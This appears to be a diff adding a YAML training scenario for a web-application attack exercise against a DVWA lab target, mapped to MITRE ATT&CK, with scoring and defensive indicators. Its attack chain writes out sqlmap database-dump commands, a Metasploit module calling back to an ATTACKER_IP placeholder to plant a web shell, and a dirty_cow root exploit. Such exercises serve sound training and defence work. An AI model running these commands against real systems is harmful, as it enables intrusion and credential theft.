@@ -1,0 +1,220 @@
+# Web Application Attack Scenario
+# MITRE ATT&CK: T1190 (Exploit Public-Facing Application)
+
+scenario:
+  id: "attack-001"
+  name: "Web Application Exploitation"
+  description: "Multi-stage web application attack including reconnaissance, exploitation, and privilege escalation"
+  difficulty: "intermediate"
+  duration_minutes: 30
+
+mitre_attack:
+  tactics:
+    - "TA0001"  # Initial Access
+    - "TA0003"  # Persistence
+    - "TA0004"  # Privilege Escalation
+    - "TA0005"  # Defense Evasion
+
+  techniques:
+    - id: "T1190"
+      name: "Exploit Public-Facing Application"
+      tactic: "Initial Access"
+
+    - id: "T1059.007"
+      name: "Command and Scripting Interpreter: JavaScript"
+      tactic: "Execution"
+
+    - id: "T1505.003"
+      name: "Server Software Component: Web Shell"
+      tactic: "Persistence"
+
+    - id: "T1068"
+      name: "Exploitation for Privilege Escalation"
+      tactic: "Privilege Escalation"
+
+attack_chain:
+  - step: 1
+    name: "Reconnaissance"
+    technique: "T1592"
+    description: "Gather information about target web application"
+    commands:
+      - tool: "nmap"
+        args: "-sV -p 80,443,8080 {{TARGET_IP}}"
+        expected_output: "Open ports and service versions"
+
+      - tool: "nikto"
+        args: "-h http://{{TARGET_IP}}"
+        expected_output: "Web server vulnerabilities"
+
+      - tool: "whatweb"
+        args: "http://{{TARGET_IP}}"
+        expected_output: "Web technologies in use"
+
+    success_criteria:
+      - "Identified web server version"
+      - "Discovered web technologies"
+      - "Found potential vulnerabilities"
+
+  - step: 2
+    name: "SQL Injection Discovery"
+    technique: "T1190"
+    description: "Test for SQL injection vulnerabilities"
+    commands:
+      - tool: "sqlmap"
+        args: "-u http://{{TARGET_IP}}/login.php --forms --batch --risk=3"
+        expected_output: "SQL injection vulnerability found"
+
+    success_criteria:
+      - "Confirmed SQL injection vulnerability"
+      - "Identified database type"
+
+  - step: 3
+    name: "Database Extraction"
+    technique: "T1213"
+    description: "Extract sensitive data from database"
+    commands:
+      - tool: "sqlmap"
+        args: "-u http://{{TARGET_IP}}/login.php --forms --batch --dump -D webapp"
+        expected_output: "Database contents extracted"
+
+    success_criteria:
+      - "Retrieved database schema"
+      - "Extracted user credentials"
+      - "Obtained sensitive data"
+
+  - step: 4
+    name: "Web Shell Upload"
+    technique: "T1505.003"
+    description: "Upload web shell for persistent access"
+    commands:
+      - tool: "msfconsole"
+        args: |
+          use exploit/multi/http/php_cgi_arg_injection
+          set RHOST {{TARGET_IP}}
+          set LHOST {{ATTACKER_IP}}
+          exploit
+        expected_output: "Web shell uploaded successfully"
+
+    success_criteria:
+      - "Web shell accessible"
+      - "Remote code execution confirmed"
+
+  - step: 5
+    name: "Privilege Escalation"
+    technique: "T1068"
+    description: "Escalate to root privileges"
+    commands:
+      - tool: "linux-exploit-suggester"
+        args: ""
+        expected_output: "Kernel exploit suggestions"
+
+      - tool: "exploit"
+        args: "./dirty_cow"
+        expected_output: "Root shell obtained"
+
+    success_criteria:
+      - "Root access achieved"
+      - "Full system compromise"
+
+defense_detection:
+  indicators:
+    - type: "network"
+      description: "Multiple HTTP requests with SQL injection patterns"
+      pattern: "' OR 1=1--"
+      severity: "HIGH"
+
+    - type: "file"
+      description: "Suspicious PHP file upload"
+      pattern: "*.php in /var/www/uploads/"
+      severity: "CRITICAL"
+
+    - type: "process"
+      description: "Unusual web server child processes"
+      pattern: "apache2 spawning /bin/bash"
+      severity: "CRITICAL"
+
+    - type: "log"
+      description: "Multiple failed authentication attempts"
+      pattern: "Failed password for .* from {{ATTACKER_IP}}"
+      severity: "MEDIUM"
+
+defensive_measures:
+  preventive:
+    - "Input validation and sanitization"
+    - "Parameterized SQL queries"
+    - "Web Application Firewall (WAF) rules"
+    - "File upload restrictions"
+    - "Least privilege permissions"
+
+  detective:
+    - "SQL injection signature detection"
+    - "Anomalous HTTP request patterns"
+    - "File integrity monitoring"
+    - "Process execution monitoring"
+    - "Authentication failure alerts"
+
+  responsive:
+    - "Block attacker IP address"
+    - "Terminate suspicious processes"
+    - "Isolate compromised system"
+    - "Initiate incident response"
+    - "Patch vulnerable applications"
+
+learning_objectives:
+  - "Understand web application attack lifecycle"
+  - "Learn SQL injection exploitation techniques"
+  - "Practice web shell deployment"
+  - "Understand privilege escalation vectors"
+  - "Learn defensive detection methods"
+
+difficulty_modifiers:
+  easy:
+    - "Pre-configured vulnerable application"
+    - "Known exploits provided"
+    - "Hints for each step"
+
+  hard:
+    - "Custom hardened application"
+    - "WAF enabled"
+    - "Advanced detection systems active"
+    - "Limited time window"
+
+scoring:
+  max_points: 1000
+  breakdown:
+    reconnaissance: 100
+    vulnerability_discovery: 200
+    exploitation: 300
+    persistence: 200
+    privilege_escalation: 200
+
+  time_bonus:
+    - threshold_minutes: 15
+      bonus_points: 200
+    - threshold_minutes: 20
+      bonus_points: 100
+    - threshold_minutes: 25
+      bonus_points: 50
+
+environment:
+  required_tools:
+    - nmap
+    - nikto
+    - whatweb
+    - sqlmap
+    - metasploit
+    - linux-exploit-suggester
+
+  target_system:
+    os: "Ubuntu 20.04"
+    services:
+      - apache2
+      - mysql
+      - php
+    vulnerable_apps:
+      - "DVWA (Damn Vulnerable Web App)"
+
+  network:
+    subnet: "10.0.100.0/24"
+    target_ip: "10.0.100.10"
+    attacker_ip: "10.0.100.50"
